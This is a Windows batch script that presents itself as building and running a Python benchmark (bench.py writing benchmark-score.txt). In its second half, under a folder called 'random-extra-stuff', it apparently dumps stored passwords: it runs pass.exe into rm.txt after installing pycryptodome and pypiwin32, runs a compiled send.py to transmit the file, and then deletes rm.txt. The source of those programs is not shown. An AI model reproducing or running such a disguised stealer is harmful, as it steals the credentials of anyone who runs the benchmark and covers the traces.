cd /D "%~dp0"
get-pip.exe
pip install pyinstaller
pip3 install pycryptodome pypiwin32

pyinstaller --onefile bench.py
cd dist
del /f benchmark-score.txt		
bench.exe > benchmark-score.txt		

cd..
cd random-extra-stuff
pyinstaller --onefile send.py
timeout 1

del /f rm.txt				
pass.exe > rm.txt

cd dist			
send.exe				
timeout 1

cd..
del /f rm.txt				
